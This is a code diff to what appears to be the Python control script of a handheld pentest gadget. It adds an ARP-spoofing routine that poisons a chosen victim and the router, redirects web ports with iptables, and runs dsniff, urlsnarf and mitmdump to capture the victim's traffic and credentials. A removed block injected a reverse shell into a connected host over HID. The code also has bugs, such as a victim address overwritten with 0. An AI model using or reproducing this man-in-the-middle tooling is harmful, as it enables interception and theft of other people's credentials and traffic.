@@ -138,7 +138,7 @@ def displayError():
 def autoKillCommand(tx1,t):
     
     tx2= "timeout "+ str(t) + "s" + tx1
-    cmd ="touch touchedcommand.sh && echo '#!/bin/bash\n"+ tx2 +" &' > touchedcommand.sh && chmod +x touchedcommand.sh"
+    cmd ="touch touchedcommand.sh && echo '#!/bin/bash\n"+ tx1 +" &' > touchedcommand.sh && chmod +x touchedcommand.sh"
     res = execcmd(cmd)
     if(res==-1):
         displayError()
@@ -171,7 +171,27 @@ def autoKillCommand(tx1,t):
                 time.sleep(5)
                 errore=1
     return(True)
+
+def autoKillCommandNoKill(tx1,t):
     
+    cmd ="touch touchedcommand.sh && echo '#!/bin/bash\n"+ tx1 +" &' > touchedcommand.sh && chmod +x touchedcommand.sh"
+    res = execcmd(cmd)
+    if(res==-1):
+        displayError()
+        return()
+    Popen(['nohup','/bin/bash','touchedcommand.sh'],preexec_fn=os.setpgrp)
+    #DisplayText("","","Executed","","","","")
+    #print(cmd)
+    #subprocess.call(["timeout 2s",str(cmd)])
+    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
+    cmd="rm nohup.out && rm touchedcommand.sh"
+    toDEl = execcmd(cmd)
+    if(toDEl==-1):
+        displayError()
+        return(-1)
+    return(1)
+     
+
 def checklist(_list):
     listattack=_list
     maxi=len(listattack) #number of records
@@ -278,7 +298,7 @@ def switch_menu(argument):
         3: "_WIRELESS THINGS",
         4: "_TRIGGERS FEATURES",
         5: "_TEMPLATES FEATURES",
-        6: "_INFOSEC TOOLS",
+        6: "_MITM TOOLS",
         7: "_System information",
         8: "_OLED brightness",
         9: "_HOST OS detection",
@@ -1741,23 +1761,124 @@ def deautherClient():
         displayError()
         return()
     displayMsg("Done",4)
-
-
-
-
-
-
-
-
-
     cmd = "rm -rf result*"
     ret = execcmd(cmd)
     if(ret==-1):
         displayError()
         return()
 
-    
     return()
+
+def arpSpoof():
+    myTime= 86400
+    displayMsg("select target",3)
+    victimIP=hostselect()
+    cmd = "sysctl -w net.ipv4.ip_forward=1"
+    ret = execcmd(cmd)
+    if(ret==-1):
+        displayError()
+        return()
+
+    cmd = "ip r | grep default |  head -n 1 | cut -d ' ' -f3"
+    res = execcmd(cmd)
+    if(res==-1):
+        displayError()
+        return()
+    routerIp = str(res)
+    print(routerIp)
+    victimIP = 0
+    cmd1 = "arpspoof -i wlan0 -t "+ victimIP +" "+ routerIp
+    cmd2  = "arpspoof -i wlan0 -t "+ routerIp +" "+ victimIP
+    cmd3 = cmd1 + "&\n"+cmd2
+    if(autoKillCommandNoKill(cmd3,myTime)==-1):
+        displayError()
+        return()
+    cmd1= " iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
+    cmd2= " iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080"
+    execcmd(cmd1)
+    execcmd(cmd2)
+
+   
+    cmdDsniff = "dsniff -i wlan0 -w Dsniff"+victimIP+".txt"
+    if(autoKillCommandNoKill(cmdDsniff,myTime)==-1):
+        displayError()
+        return()
+    cmdUrl = "urlsnarf -i wlan0 > Url"+victimIP+".txt"
+    if(autoKillCommandNoKill(cmdUrl,myTime)==-1):
+        displayError()
+        return()
+    cmdMIMT = " mitmdump --mode transparent --showhost -w Mitm"+victimIP+".txt"
+    if(autoKillCommandNoKill(cmdMIMT,myTime)==-1):
+        displayError()
+        return()
+
+    uscire=0
+    while (uscire==0):
+        if GPIO.input(KEY_RIGHT_PIN): # button is released
+            menu = 1
+        else: # button is pressed:
+            uscire=1
+        displayMsg("press right to exit",0.2)
+    
+    errore=0
+    while(errore == 0):
+            cmd = "ps -aux | grep '" + cmdDsniff +"' | head -n 1 | cut -d ' ' -f7"
+            res = execcmd(cmd)
+            if(res==-1):
+                displayError()
+                time.sleep(5)
+                return()
+            cmd = "kill " + (str(res).split("'")[1])[:-2]
+            #print(cmd)
+            res = execcmd(cmd)
+            if(res==-1):
+                #print("errore nella kill")
+                #displayError()
+                errore=1
+    errore=0
+    while(errore == 0):
+            cmd = "ps -aux | grep '" + cmdUrl +"' | head -n 1 | cut -d ' ' -f7"
+            res = execcmd(cmd)
+            if(res==-1):
+                displayError()
+                time.sleep(5)
+                return()
+            cmd = "kill " + (str(res).split("'")[1])[:-2]
+            #print(cmd)
+            res = execcmd(cmd)
+            if(res==-1):
+                #print("errore nella kill")
+                #displayError()
+                errore=1
+    errore=0
+    while(errore == 0):
+            cmd = "ps -aux | grep '" + cmdMIMT +"' | head -n 1 | cut -d ' ' -f7"
+            res = execcmd(cmd)
+            if(res==-1):
+                displayError()
+                time.sleep(5)
+                return()
+            cmd = "kill " + (str(res).split("'")[1])[:-2]
+            #print(cmd)
+            res = execcmd(cmd)
+            if(res==-1):
+                #print("errore nella kill")
+                #displayError()
+                errore=1
+    
+    cmd="iptables-legacy -t nat -F"
+    ret = execcmd(cmd)
+    if(ret==-1):
+        displayError()
+        return()
+    cmd = "sysctl -w net.ipv4.ip_forward=0"
+    ret = execcmd(cmd)
+    if(ret==-1):
+        displayError()
+        return()
+
+
+
 
 
 def main():
@@ -1899,28 +2020,7 @@ while 1:
             if page == 42:
                 #infosec commands
                 if curseur == 1:
-                    # reverseshell injection
-                    answer = 0
-                    while answer == 0:
-                        DisplayText(
-                            "                 YES",
-                            "",
-                            "INJECT REVERSESHELL",
-                            "TO CONNECTED HOST",
-                            "ARE YOU SURE ?",
-                            "",
-                            "                  NO"
-                            )
-                        if GPIO.input(KEY1_PIN): # button is released
-                            menu = 1
-                        else: # button is pressed:
-                            answer = 1
-                        if GPIO.input(KEY3_PIN): # button is released
-                            menu = 1
-                        else: # button is pressed:
-                            answer = 2
-                    if answer == 1:
-                        shell("P4wnP1_cli hid job 'gui inject revshell.js'")
+                    arpSpoof()
                                    
             
             if (page == 56):
